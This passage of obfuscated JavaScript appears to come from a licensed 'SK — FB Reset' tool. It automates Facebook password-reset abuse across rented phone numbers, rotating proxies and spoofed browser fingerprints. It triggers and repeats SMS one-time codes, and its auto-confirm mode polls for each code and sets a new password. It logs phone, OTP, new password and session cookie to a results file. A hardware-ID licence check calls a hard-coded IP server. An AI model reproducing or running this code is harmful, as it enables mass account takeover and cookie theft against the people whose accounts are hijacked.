        dbg('+' + v1413 + " BLOKS FAIL: no account or SMS trigger failed");
        const v1444 = {};
        return v1444.result = "no_sms", v1444.ua = v1416, v1444.proxyIdx = v1414, v1444.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1444.proxy = v1415, v1444;
      }
      dbg('+' + v1413 + " BLOKS SUCCESS [via_browser] — OTP dispatched via auth_option_selection.async");
      const v1443 = {};
      return v1443.result = "success", v1443.ua = v1416, v1443.ctx = v1421, v1443.proxyIdx = v1414, v1443.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1443.proxy = v1415, v1443;
    }
    let v1438 = v1437;
    if (v1434.accounts.length > 0x0) {
      v1434.accounts.length > 0x1 && dbg('+' + v1413 + " MULTI: " + v1434.accounts.length + " accounts, selecting first");
      const v1445 = await withHardTimeout(selectAccount(v1434.accounts[0x0], v1437, 0x0, v1423, v1415, v1416, v1419, v1417, v1433), 0x7530, "selectAccount"),
        v1446 = {};
      v1446.result = "error", v1446.proxyFault = false, v1446.ua = v1416, v1446.proxyIdx = v1414, v1446.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1446.proxy = v1415;
      if (!v1445.ok) return v1446;
      if (v1445.selectCipher) v1438 = v1445.selectCipher;
    }
    const v1439 = await withHardTimeout(getInitiateView(v1438, v1423, v1415, v1416, v1419, v1417, v1433), 0x7530, "getInitiateView");
    if (!v1439.ok) {
      const v1447 = v1439.error === "no cipher in initiate view" || v1439.error === "no_sms" ? "no_sms" : "error",
        v1448 = {};
      return v1448.result = v1447, v1448.proxyFault = false, v1448.ua = v1416, v1448.proxyIdx = v1414, v1448.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1448.proxy = v1415, v1448;
    }
    const v1440 = await withHardTimeout(sendOTP(v1435, v1436, v1439.cipher, v1439.recoverMethod, v1423, v1415, v1416, v1419, v1417, v1433), 0xea60, "sendOTP");
    if (!v1440.ok) {
      dbg('+' + v1413 + " OTP FAIL: " + v1440.error);
      const v1449 = v1440.error === "captcha" ? "captcha" : "error",
        v1450 = {};
      return v1450.result = v1449, v1450.proxyFault = false, v1450.ua = v1416, v1450.proxyIdx = v1414, v1450.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1450.proxy = v1415, v1450;
    }
    for (let v1451 = 0x0; v1451 < v1412; v1451++) {
      await sleep(0x1388), await withHardTimeout(sendOTP(v1435, v1436, v1439.cipher, v1439.recoverMethod, v1423, v1415, v1416, v1419, v1417, v1433), 0xea60, "sendOTP");
    }
    dbg('+' + v1413 + " SUCCESS [" + v1416.browserType + ']');
    const v1441 = {};
    return v1441.result = "success", v1441.ua = v1416, v1441.ctx = v1421, v1441.proxyIdx = v1414, v1441.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1441.proxy = v1415, v1441;
  } catch (v1452) {
    const v1453 = isProxyLevelError(v1452);
    dbg('+' + v1413 + " EXCEPTION [proxyFault=" + v1453 + "]: " + v1452.message);
    const v1454 = {};
    return v1454.result = "error", v1454.proxyFault = v1453, v1454.ua = v1416, v1454.proxyIdx = v1414, v1454.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1454.proxy = v1415, v1454;
  }
}
const PHONE_PREFIX_MAP = [["1242", "🇧🇸", "Bahamas"], ["1246", "🇧🇧", "Barbados"], ["1264", "🇦🇮", "Anguilla"], ["1268", "🇦🇬", "Antigua"], ["1284", "🇻🇬", "British VI"], ["1340", "🇻🇮", "US VI"], ["1345", "🇰🇾", "Cayman Is."], ["1441", "🇧🇲", "Bermuda"], ["1473", "🇬🇩", "Grenada"], ["1649", "🇹🇨", "Turks & Caicos"], ["1664", "🇲🇸", "Montserrat"], ["1671", "🇬🇺", "Guam"], ["1684", "🇦🇸", "Am. Samoa"], ["1721", "🇸🇽", "Sint Maarten"], ["1758", "🇱🇨", "St. Lucia"], ["1767", "🇩🇲", "Dominica"], ["1784", "🇻🇨", "St. Vincent"], ["1868", "🇹🇹", "Trinidad"], ["1869", "🇰🇳", "St. Kitts"], ["1876", "🇯🇲", "Jamaica"], ["1939", "🇵🇷", "Puerto Rico"], ['20', "🇪🇬", "Egypt"], ["211", "🇸🇸", "S. Sudan"], ["212", "🇲🇦", "Morocco"], ["213", "🇩🇿", "Algeria"], ["216", "🇹🇳", "Tunisia"], ["218", "🇱🇾", "Libya"], ["220", "🇬🇲", "Gambia"], ["221", "🇸🇳", "Senegal"], ["222", "🇲🇷", "Mauritania"], ["223", "🇲🇱", "Mali"], ["224", "🇬🇳", "Guinea"], ["225", "🇨🇮", "Côte d'Ivoire"], ["226", "🇧🇫", "Burkina Faso"], ["227", "🇳🇪", "Niger"], ["228", "🇹🇬", "Togo"], ["229", "🇧🇯", "Benin"], ["230", "🇲🇺", "Mauritius"], ["231", "🇱🇷", "Liberia"], ["232", "🇸🇱", "Sierra Leone"], ["233", "🇬🇭", "Ghana"], ["234", "🇳🇬", "Nigeria"], ["235", "🇹🇩", "Chad"], ["236", "🇨🇫", "C. African Rep."], ["237", "🇨🇲", "Cameroon"], ["238", "🇨🇻", "Cape Verde"], ["239", "🇸🇹", "São Tomé"], ["240", "🇬🇶", "Eq. Guinea"], ["241", "🇬🇦", "Gabon"], ["242", "🇨🇬", "Congo"], ["243", "🇨🇩", "DR Congo"], ["244", "🇦🇴", "Angola"], ["245", "🇬🇼", "Guinea-Bissau"], ["247", "🇦🇨", "Ascension Is."], ["248", "🇸🇨", "Seychelles"], ["249", "🇸🇩", "Sudan"], ["250", "🇷🇼", "Rwanda"], ["251", "🇪🇹", "Ethiopia"], ["252", "🇸🇴", "Somalia"], ["253", "🇩🇯", "Djibouti"], ["254", "🇰🇪", "Kenya"], ["255", "🇹🇿", "Tanzania"], ["256", "🇺🇬", "Uganda"], ["257", "🇧🇮", "Burundi"], ["258", "🇲🇿", "Mozambique"], ["260", "🇿🇲", "Zambia"], ["261", "🇲🇬", "Madagascar"], ["262", "🇷🇪", "Réunion"], ["263", "🇿🇼", "Zimbabwe"], ["264", "🇳🇦", "Namibia"], ["265", "🇲🇼", "Malawi"], ["266", "🇱🇸", "Lesotho"], ["267", "🇧🇼", "Botswana"], ["268", "🇸🇿", "Eswatini"], ["269", "🇰🇲", "Comoros"], ['27', "🇿🇦", "South Africa"], ["290", "🇸🇭", "St. Helena"], ["291", "🇪🇷", "Eritrea"], ["297", "🇦🇼", "Aruba"], ["298", "🇫🇴", "Faroe Is."], ["299", "🇬🇱", "Greenland"], ['30', "🇬🇷", "Greece"], ['31', "🇳🇱", "Netherlands"], ['32', "🇧🇪", "Belgium"], ['33', "🇫🇷", "France"], ['34', "🇪🇸", "Spain"], ["350", "🇬🇮", "Gibraltar"], ["351", "🇵🇹", "Portugal"], ["352", "🇱🇺", "Luxembourg"], ["353", "🇮🇪", "Ireland"], ["354", "🇮🇸", "Iceland"], ["355", "🇦🇱", "Albania"], ["356", "🇲🇹", "Malta"], ["357", "🇨🇾", "Cyprus"], ["358", "🇫🇮", "Finland"], ["359", "🇧🇬", "Bulgaria"], ['36', "🇭🇺", "Hungary"], ["370", "🇱🇹", "Lithuania"], ["371", "🇱🇻", "Latvia"], ["372", "🇪🇪", "Estonia"], ["373", "🇲🇩", "Moldova"], ["374", "🇦🇲", "Armenia"], ["375", "🇧🇾", "Belarus"], ["376", "🇦🇩", "Andorra"], ["377", "🇲🇨", "Monaco"], ["378", "🇸🇲", "San Marino"], ["380", "🇺🇦", "Ukraine"], ["381", "🇷🇸", "Serbia"], ["382", "🇲🇪", "Montenegro"], ["385", "🇭🇷", "Croatia"], ["386", "🇸🇮", "Slovenia"], ["387", "🇧🇦", "Bosnia"], ["389", "🇲🇰", "N. Macedonia"], ['39', "🇮🇹", "Italy"], ['40', "🇷🇴", "Romania"], ['41', "🇨🇭", "Switzerland"], ["420", "🇨🇿", "Czechia"], ["421", "🇸🇰", "Slovakia"], ["423", "🇱🇮", "Liechtenstein"], ['43', "🇦🇹", "Austria"], ['44', "🇬🇧", 'UK'], ['45', "🇩🇰", "Denmark"], ['46', "🇸🇪", "Sweden"], ['47', "🇳🇴", "Norway"], ['48', "🇵🇱", "Poland"], ['49', "🇩🇪", "Germany"], ["500", "🇫🇰", "Falkland Is."], ["501", "🇧🇿", "Belize"], ["502", "🇬🇹", "Guatemala"], ["503", "🇸🇻", "El Salvador"], ["504", "🇭🇳", "Honduras"], ["505", "🇳🇮", "Nicaragua"], ["506", "🇨🇷", "Costa Rica"], ["507", "🇵🇦", "Panama"], ["508", "🇵🇲", "St. Pierre"], ["509", "🇭🇹", "Haiti"], ['51', "🇵🇪", "Peru"], ['52', "🇲🇽", "Mexico"], ['53', "🇨🇺", "Cuba"], ['54', "🇦🇷", "Argentina"], ['55', "🇧🇷", "Brazil"], ['56', "🇨🇱", "Chile"], ['57', "🇨🇴", "Colombia"], ['58', "🇻🇪", "Venezuela"], ["590", "🇬🇵", "Guadeloupe"], ["591", "🇧🇴", "Bolivia"], ["592", "🇬🇾", "Guyana"], ["593", "🇪🇨", "Ecuador"], ["594", "🇬🇫", "Fr. Guiana"], ["595", "🇵🇾", "Paraguay"], ["596", "🇲🇶", "Martinique"], ["597", "🇸🇷", "Suriname"], ["598", "🇺🇾", "Uruguay"], ["599", "🇨🇼", "Curaçao"], ['60', "🇲🇾", "Malaysia"], ['61', "🇦🇺", "Australia"], ['62', "🇮🇩", "Indonesia"], ['63', "🇵🇭", "Philippines"], ['64', "🇳🇿", "New Zealand"], ['65', "🇸🇬", "Singapore"], ['66', "🇹🇭", "Thailand"], ["670", "🇹🇱", "Timor-Leste"], ["673", "🇧🇳", "Brunei"], ["674", "🇳🇷", "Nauru"], ["675", "🇵🇬", "Papua NG"], ["676", "🇹🇴", "Tonga"], ["677", "🇸🇧", "Solomon Is."], ["678", "🇻🇺", "Vanuatu"], ["679", "🇫🇯", "Fiji"], ["680", "🇵🇼", "Palau"], ["685", "🇼🇸", "Samoa"], ["686", "🇰🇮", "Kiribati"], ["688", "🇹🇻", "Tuvalu"], ["689", "🇵🇫", "Fr. Polynesia"], ["691", "🇫🇲", "Micronesia"], ["692", "🇲🇭", "Marshall Is."], ['7', "🇷🇺", "Russia"], ['81', "🇯🇵", "Japan"], ['82', "🇰🇷", "South Korea"], ['84', "🇻🇳", "Vietnam"], ["850", "🇰🇵", "North Korea"], ["852", "🇭🇰", "Hong Kong"], ["853", "🇲🇴", "Macau"], ["855", "🇰🇭", "Cambodia"], ["856", "🇱🇦", "Laos"], ['86', "🇨🇳", "China"], ["880", "🇧🇩", "Bangladesh"], ["886", "🇹🇼", "Taiwan"], ['90', "🇹🇷", "Turkey"], ['91', "🇮🇳", "India"], ['92', "🇵🇰", "Pakistan"], ['93', "🇦🇫", "Afghanistan"], ['94', "🇱🇰", "Sri Lanka"], ['95', "🇲🇲", "Myanmar"], ["960", "🇲🇻", "Maldives"], ["961", "🇱🇧", "Lebanon"], ["962", "🇯🇴", "Jordan"], ["963", "🇸🇾", "Syria"], ["964", "🇮🇶", "Iraq"], ["965", "🇰🇼", "Kuwait"], ["966", "🇸🇦", "Saudi Arabia"], ["967", "🇾🇪", "Yemen"], ["968", "🇴🇲", "Oman"], ["970", "🇵🇸", "Palestine"], ["971", "🇦🇪", "UAE"], ["972", "🇮🇱", "Israel"], ["973", "🇧🇭", "Bahrain"], ["974", "🇶🇦", "Qatar"], ["975", "🇧🇹", "Bhutan"], ["976", "🇲🇳", "Mongolia"], ["977", "🇳🇵", "Nepal"], ['98', "🇮🇷", "Iran"], ["992", "🇹🇯", "Tajikistan"], ["993", "🇹🇲", "Turkmenistan"], ["994", "🇦🇿", "Azerbaijan"], ["995", "🇬🇪", "Georgia"], ["996", "🇰🇬", "Kyrgyzstan"], ["998", "🇺🇿", "Uzbekistan"], ['1', "🇺🇸", "USA/Canada"]];
function getPhoneCountry(v1455) {
  const v1456 = v1455.replace(/^\+/, '').replace(/^0+/, '');
  for (const [v1458, v1459, v1460] of PHONE_PREFIX_MAP) {
    const v1461 = {};
    v1461.flag = v1459, v1461.name = v1460;
    if (v1456.startsWith(v1458)) return v1461;
  }
  const v1457 = {};
  return v1457.flag = '🌐', v1457.name = "Unknown", v1457;
}
function getProxyCountry(v1462) {
  if (!v1462 || !v1462.user) return null;
  const v1463 = v1462.user,
    v1464 = v1463.match(/(?:country|cc|cr|zone|region|geo)[-_.]?([a-zA-Z]{2})(?:[-_.]|$)/i) || v1463.match(/[-_]([a-zA-Z]{2})[-_]sess/i) || v1463.match(/_([a-zA-Z]{2})$/i);
  if (!v1464) return null;
  const v1465 = v1464[0x1].toUpperCase(),
    v1466 = [...v1465].map(v1468 => String.fromCodePoint(v1468.codePointAt(0x0) + 0x1f1a5)).join('');
  const v1467 = {};
  v1467.iso = v1465;
  return v1467.flag = v1466, v1467;
}
class Dashboard {
  constructor(v1469) {
    this.totalNumbers = v1469;
    this.processed = 0x0, this.successful = 0x0, this.noAccount = 0x0;
    this.noSms = 0x0, this.captcha = 0x0, this.errors = 0x0;
  }
  ["record"](v1470, v1471, v1472, v1473, v1474, v1475) {
    this.processed++;
    let v1476 = '';
    const v1477 = getPhoneCountry(v1471),
      v1478 = getProxyCountry(v1475),
      v1479 = v1473 && v1473.lang ? v1473.lang.split(',')[0x0].trim() : '';
    const v1480 = FB_MUTED('\x20[' + v1477.flag + v1477.name + (v1478 ? " │ Proxy:" + v1478.flag + v1478.iso : '') + (v1479 ? " │ " + v1479 : '') + ']');
    let v1481 = "Unknown";
    if (v1472 && v1472.browserType) {
      const v1483 = {};
      v1483.chrome = "Chrome", v1483.firefox = "Firefox", v1483.edge = "Edge", v1483.samsung = "Samsung", v1483.duckduckgo = "DuckDuckGo", v1483.opera = "Opera", v1483.brave = "Brave", v1483.vivaldi = "Vivaldi", v1483.safari = "Safari", v1483.via_browser = "Via", v1483.mweb_pixel8 = "Mweb";
      const v1484 = v1483,
        v1485 = v1484[v1472.browserType] || v1472.browserType,
        v1486 = v1472.isMobile ? '📱' : '🖥';
      v1481 = '' + v1486 + v1485;
    }
    const v1482 = FB_MUTED('\x20[' + v1481 + ']');
    if (v1470 === "success") this.successful++, v1476 = chalk.hex("#00FF88")("SK — Reset │ OTP Sent → ") + chalk.hex("#FCAF45").bold(v1471) + v1482 + v1480;else {
      if (v1470 === "no_account") this.noAccount++, v1476 = chalk.hex("#FF4466")("SK — Reset │ No Account → ") + chalk.hex("#888888")(v1471) + v1482 + v1480;else {
        if (v1470 === "no_sms") this.noSms++, v1476 = chalk.hex("#FF9900")("SK — Reset │ No SMS Opt → ") + chalk.hex("#888888")(v1471) + v1482 + v1480;else v1470 === "captcha" ? (this.captcha++, v1476 = chalk.hex("#FF9900")("SK — Reset │ Captcha Block → ") + chalk.hex("#888888")(v1471) + v1482 + v1480) : (this.errors++, v1476 = chalk.hex("#FF4466")("SK — Reset │ Failed/Drop → ") + chalk.hex("#888888")(v1471) + v1482 + v1480);
      }
    }
    process.stdout.write("\r[K" + v1476 + '\x0a'), this.render();
  }
  ["render"]() {
    const v1487 = (this.processed / Math.max(this.totalNumbers, 0x1) * 0x64).toFixed(0x1),
      v1488 = '\x20\x20' + W.bold("SK-RESET") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v1487 + "% │ " + B("OK: " + this.successful) + " │ " + R("Err: " + (this.noAccount + this.noSms + this.captcha + this.errors));
    process.stdout.write("\r[K" + v1488);
  }
  ["stop"]() {
    console.log('\x0a');
  }
}
async function runPool(v1489, v1490, v1491, v1492, v1493 = null, v1494 = 0x0, v1495 = 0x0, v1496 = null, v1497 = null, v1498 = null) {
  const v1499 = v1493 || v1496 || v1497 || v1498,
    v1500 = new Dashboard(v1499 ? v1499.totalCount : v1489.length),
    v1501 = {};
  v1501.success = [], v1501.noAccount = [], v1501.noSms = [], v1501.captcha = [], v1501.errors = [];
  const v1502 = v1501;
  let v1503 = [],
    v1504 = [],
    v1505 = 0x0;
  let v1506 = false;
  const v1507 = new Map();
  if (v1493 || v1496) (async () => {
    try {
      for (let v1514 = 0x0; v1514 < v1499.totalCount; v1514++) {
        try {
          const v1515 = v1499.ranges[Math.floor(Math.random() * v1499.ranges.length)];
          let v1516;
          v1493 ? v1516 = await nexaLimiter.enqueue(() => nexaFetchNumber(v1493.apiKey, v1515, v1493.serverEndpoint)) : v1516 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v1496.apiKey, v1515, v1496.getPath)), v1516 && (v1505++, v1504.length > 0x0 ? v1504.shift()(v1516) : v1503.push(v1516));
        } catch (v1517) {
          if (v1517.message.includes("Insufficient balance")) break;
          if (v1517.message.includes("No numbers available")) continue;
        }
      }
    } finally {
      v1506 = true;
      while (v1504.length > 0x0) v1504.shift()(null);
    }
  })();else {
    if (v1497) {
      const v1518 = v1497;
      (async () => {
        let v1519 = 0x0,
          v1520 = 0x0;
        try {
          for (let v1521 = 0x0; v1521 < v1518.totalCount; v1521++) {
            try {
              const {
                activationId: v1522,
                phoneNumber: v1523
              } = await smsBowerFetchNumber(v1518.apiKey, v1518.service, v1518.country, v1518.maxPrice);
              v1507.set(v1523, v1522), v1519++, v1520 = 0x0;
              if (v1504.length > 0x0) v1504.shift()(v1523);else v1503.push(v1523);
            } catch (v1524) {
              v1520++;
              if (v1520 >= 0x5 && v1519 === 0x0) break;
              await new Promise(v1525 => setTimeout(v1525, 0x7d0));
            }
          }
        } finally {
          v1506 = true;
          while (v1504.length > 0x0) v1504.shift()(null);
        }
      })();
    } else {
      if (v1498) {
        const v1526 = v1498;
        (async () => {
          let v1527 = 0x0,
            v1528 = 0x0;
          try {
            for (let v1529 = 0x0; v1529 < v1526.totalCount; v1529++) {
              try {
                const v1530 = v1526.ranges[Math.floor(Math.random() * v1526.ranges.length)],
                  v1531 = await zenexFetchNumber(v1526.apiKey, v1530);
                v1527++, v1528 = 0x0;
                if (v1504.length > 0x0) v1504.shift()(v1531);else v1503.push(v1531);
              } catch (v1532) {
                v1528++;
                if (v1528 >= 0x5 && v1527 === 0x0) break;
                await new Promise(v1533 => setTimeout(v1533, 0x7d0));
              }
            }
          } finally {
            v1506 = true;
            while (v1504.length > 0x0) v1504.shift()(null);
          }
        })();
      }
    }
  }
  const v1508 = !!(v1493 || v1496 || v1497 || v1498),
    v1509 = v1508 ? () => {
      if (v1503.length > 0x0) return Promise.resolve(v1503.shift());
      if (v1506) return Promise.resolve(null);
      return new Promise(v1534 => v1504.push(v1534));
    } : () => {
      if (v1489.length === 0x0) return Promise.resolve(null);
      const v1535 = Math.floor(Math.random() * v1489.length);
      return Promise.resolve(v1489.splice(v1535, 0x1)[0x0]);
    };
  async function fn23() {
    while (true) {
      const v1536 = await v1509();
      if (!v1536) break;
      let v1537;
      const v1538 = (typeof v1495 === "number" ? v1495 : 0x0) + 0x1;
      for (let v1539 = 0x1; v1539 <= v1538; v1539++) {
        v1537 = await processNumber(v1536, v1491, v1490, v1494);
        if (v1537.result === "success" || v1537.result === "no_account" || v1537.result === "no_sms" || v1537.result === "captcha") break;
        v1539 < v1538 && (await sleep(0x3e8));
      }
      if (v1492 && !v1508) removeNumberFromFile(v1492, v1536);
      v1500.record(v1537.result, v1536, v1537.ua, v1537.ctx, v1537.proxyStr, v1537.proxy);
      if (v1537.result === "success") {
        const v1540 = getPhoneCountry(v1536),
          v1541 = getProxyCountry(v1537.proxy),
          v1542 = v1537.ua && v1537.ua.browserType ? v1537.ua.browserType.charAt(0x0).toUpperCase() + v1537.ua.browserType.slice(0x1) : "Unknown",
          v1543 = v1537.ua && v1537.ua.isMobile ? "Mobile" : "Desktop",
          v1544 = v1537.proxy ? v1537.proxy.host + ':' + v1537.proxy.port : "Direct",
          v1545 = v1541 ? '' + v1541.flag + v1541.iso : "Direct";
        v1502.success.push(v1536 + " | Browser:" + v1543 + '/' + v1542 + " | Country:" + v1540.flag + v1540.name + " | Proxy:" + v1545 + '\x20(' + v1544 + ')');
        if (v1537.proxyIdx >= 0x0) proxyManager.recordSuccess(v1537.proxyIdx);
        if (v1497 && v1497.autoConfirm) {
          const v1546 = v1507.get(v1536);
          if (v1546) {
            const v1547 = await smsBowerPollOtp(v1497.apiKey, v1546, 0xdbba0);
            if (v1547) try {
              const v1548 = v1497.newPassword || "Password@2026",
                v1549 = await processConfirm(v1536, v1547, v1548, 0x0);
              if (v1549.result === "confirmed") {
                v1500.record("confirmed_auto", v1536, v1549.ua, v1549.hostCtx, v1549.proxy ? v1549.proxy.host + ':' + v1549.proxy.port : "Direct", v1549.proxy);
                try {
                  const v1550 = require("xlsx"),
                    v1551 = path.join(__dirname, "results", "auto_confirmed.xlsx"),
                    v1552 = {};
                  v1552.recursive = true;
                  if (!fs.existsSync(path.join(__dirname, "results"))) fs.mkdirSync(path.join(__dirname, "results"), v1552);
                  let v1553, v1554;
                  fs.existsSync(v1551) ? (v1553 = v1550.readFile(v1551), v1554 = v1553.Sheets[v1553.SheetNames[0x0]]) : (v1553 = v1550.utils.book_new(), v1554 = v1550.utils.aoa_to_sheet([["Phone", "OTP", "New Password", "Cookie"]]), v1550.utils.book_append_sheet(v1553, v1554, "Confirmed"));
                  const v1555 = v1550.utils.decode_range(v1554["!ref"] || 'A1'),
                    v1556 = v1555.e.r + 0x1,
                    v1557 = {};
                  v1557.r = v1556, v1557.c = 0x0;
                  const v1558 = {};
                  v1558.origin = v1557, v1550.utils.sheet_add_aoa(v1554, [[v1536, v1547, v1548, v1549.cookieStr || '']], v1558);
                  const v1559 = {};
                  v1559.r = 0x0, v1559.c = 0x0;
                  const v1560 = {};
                  v1560.r = v1556, v1560.c = 0x3;
                  const v1561 = {};
                  v1561.s = v1559, v1561.e = v1560, v1554["!ref"] = v1550.utils.encode_range(v1561), v1550.writeFile(v1553, v1551);
                } catch (v1562) {
                  fs.appendFileSync(path.join(__dirname, "results", "auto_confirmed.txt"), v1536 + '|' + v1547 + '|' + (v1497.newPassword || "Password@2026") + '|' + (v1549.cookieStr || '') + '\x0a');
                }
              }
            } catch (v1563) {} else await smsBowerSetStatus(v1497.apiKey, v1546, 0x8);
          }
        }
        if (v1498 && v1498.autoConfirm) {
          const v1564 = await zenexPollOtp(v1498.apiKey, v1536, 0xdbba0);
          if (v1564) try {
            const v1565 = v1498.newPassword || "Password@2026",
              v1566 = await processConfirm(v1536, v1564, v1565, 0x0);
            if (v1566.result === "confirmed") {
              v1500.record("confirmed_auto", v1536, v1566.ua, v1566.hostCtx, v1566.proxy ? v1566.proxy.host + ':' + v1566.proxy.port : "Direct", v1566.proxy);
              try {
                const v1567 = require("xlsx"),
                  v1568 = path.join(__dirname, "results", "auto_confirmed.xlsx"),
                  v1569 = {};
                v1569.recursive = true;
                if (!fs.existsSync(path.join(__dirname, "results"))) fs.mkdirSync(path.join(__dirname, "results"), v1569);
                let v1570, v1571;
                fs.existsSync(v1568) ? (v1570 = v1567.readFile(v1568), v1571 = v1570.Sheets[v1570.SheetNames[0x0]]) : (v1570 = v1567.utils.book_new(), v1571 = v1567.utils.aoa_to_sheet([["Phone", "OTP", "New Password", "Cookie"]]), v1567.utils.book_append_sheet(v1570, v1571, "Confirmed"));
                const v1572 = v1567.utils.decode_range(v1571["!ref"] || 'A1'),
                  v1573 = v1572.e.r + 0x1,
                  v1574 = {};
                v1574.r = v1573, v1574.c = 0x0;
                const v1575 = {};
                v1575.origin = v1574, v1567.utils.sheet_add_aoa(v1571, [[v1536, v1564, v1565, v1566.cookieStr || '']], v1575);
                const v1576 = {};
                v1576.r = 0x0, v1576.c = 0x0;
                const v1577 = {};
                v1577.r = v1573, v1577.c = 0x3;
                const v1578 = {};
                v1578.s = v1576, v1578.e = v1577, v1571["!ref"] = v1567.utils.encode_range(v1578), v1567.writeFile(v1570, v1568);
              } catch (v1579) {
                fs.appendFileSync(path.join(__dirname, "results", "auto_confirmed.txt"), v1536 + '|' + v1564 + '|' + (v1498.newPassword || "Password@2026") + '|' + (v1566.cookieStr || '') + '\x0a');
              }
            }
          } catch (v1580) {}
        }
      } else {
        if (v1537.result === "no_account") {
          v1502.noAccount.push(v1536);
          if (v1537.proxyIdx >= 0x0) proxyManager.recordSuccess(v1537.proxyIdx);
        } else {
          if (v1537.result === "no_sms") {
            v1502.noSms.push(v1536);
            if (v1537.proxyIdx >= 0x0) proxyManager.recordSuccess(v1537.proxyIdx);
          } else {
            if (v1537.result === "captcha") {
              v1502.captcha.push(v1536);
              if (v1537.proxyIdx >= 0x0) proxyManager.recordSuccess(v1537.proxyIdx);
            } else {
              v1502.errors.push(v1536);
              if (v1537.proxyIdx >= 0x0 && v1537.proxyFault === true) proxyManager.recordFailure(v1537.proxyIdx);else v1537.proxyIdx >= 0x0 && proxyManager.recordSuccess(v1537.proxyIdx);
            }
          }
        }
      }
      await sleep(0x3e8);
    }
  }
  const v1510 = v1493 || v1496 || v1497 || v1498 ? (v1493 || v1496 || v1497 || v1498).totalCount : v1489.length,
    v1511 = Math.min(v1490, v1510 || v1490),
    v1512 = {};
  v1512.length = v1511;
  const v1513 = Array.from(v1512, fn23);
  return await Promise.all(v1513), v1500.stop(), v1502;
}
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(C("   ____                                      _  ___              "));
    console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  "));
    console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | "));
    console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | "));
    console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | "));
    console.log(C("                       |_|                                |___/  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + C("SK — FB Reset                ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/scraper_king            ") + W('│'));
    console.log(W("│ [•] Version   : ") + C("5.0.4                        ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License Verified     ") + W('│'));
    global.CURRENT_HWID && console.log(W("│ [•] Hardware  : ") + Y(global.CURRENT_HWID.padEnd(0x1d)) + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
let _cachedHWID = null;
function generateHWID() {
  if (_cachedHWID) return _cachedHWID;
  const fs = require('fs');
  const path = require('path');
  const hwid_file = path.join(__dirname, '.hwid_cache.txt');
  if (fs.existsSync(hwid_file)) return _cachedHWID = fs.readFileSync(hwid_file, 'utf8').trim();
  const os = require('os');
  const child_process = require('child_process');
  const crypto = require('crypto');
  let username = os.userInfo().username || "user";
  let mac_addr = "";
  if (fs.existsSync("/data/data/com.termux") || (process.env.PREFIX && process.env.PREFIX.includes("com.termux"))) {
    try {
      mac_addr = child_process.execSync("settings get secure android_id", { stdio: 'pipe' }).toString().trim();
      if (!mac_addr) mac_addr = "termux_" + username;
    } catch (e) { mac_addr = "termux_" + username; }
  } else {
    let sys_platform = os.platform();
    if (sys_platform === "win32") {
      try {
        let output = child_process.execSync("wmic csproduct get uuid", { stdio: 'pipe' }).toString().trim();
        let lines = output.split(/\r?\n/).map(l => l.trim()).filter(l => l);
        if (lines.length > 1) {
          mac_addr = lines[1];
        }
      } catch (e) { }
    }
    if (!mac_addr) {
      const interfaces = os.networkInterfaces();
      let mac = "";
      for (let name of Object.keys(interfaces)) {
        for (let iface of interfaces[name]) {
          if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
            mac = iface.mac;
            break;
          }
        }
        if (mac) break;
      }
      if (mac) {
        mac_addr = parseInt(mac.replace(/:/g, ''), 16).toString();
      } else {
        mac_addr = "";
      }
    }
  }
  let sys_platform = os.platform();
  let os_platform = sys_platform === "win32" ? "win32" : (sys_platform === "darwin" ? "darwin" : "linux");
  let machine = os.arch();
  let os_arch = (machine === "x64" || machine === "x86_64") ? "x64" : machine;
  let hwid_str = username + "_" + mac_addr + "_" + os_platform + "_" + os_arch;
  let final_hwid = crypto.createHash('md5').update(hwid_str).digest('hex').toUpperCase().substring(0, 16);
  try { fs.writeFileSync(hwid_file, final_hwid, 'utf8'); } catch (e) { }
  return _cachedHWID = final_hwid;
}
function verifyServerSignature(v1492, v1493) {
  if (!v1493) return false;
  try {
    return crypto.verify(null, Buffer.from(v1492, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v1493, "base64"));
  } catch (v1494) {
    return false;
  }
}
async function validateLicense() {
  const http = require('http');
  console.log("   [33m[*] Validating license... [0m");
  const v1495 = generateHWID();
  if (!v1495) {
    console.error(R("\n  ✗ Could not generate Hardware ID."));
    console.error(R("  ✗ Please run on Windows or provide HWID as argument.\n"));
    process.exit(1);
  }
  global.CURRENT_HWID = v1495;
  try {
    await new Promise((resolve, reject) => {
      const katabump_url = "http://145.239.65.119:20218/auth.txt";
      const t = Math.floor(Date.now() / 1000);
      http.get(`${katabump_url}?t=${t}`, (res) => {
        if (res.statusCode !== 200) {
          console.error(R(`\n[!] Failed to connect to Auth Server (KataBump returned ${res.statusCode}).\n`));
          process.exit(1);
        }
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const statusMatch = data.match(/STATUS\s*=\s*(ON|OFF)/i);
          if (statusMatch && statusMatch[1].toUpperCase() === "OFF") {
            console.error(R(`\n[!] TOOL IS CURRENTLY DISABLED FOR MAINTENANCE.\n`));
            process.exit(1);
          }
          const hwidRegex = new RegExp(`${v1495}\\s*=\\s*(\\d+)`, 'i');
          const hwidMatch = data.match(hwidRegex);
          if (!hwidMatch) {
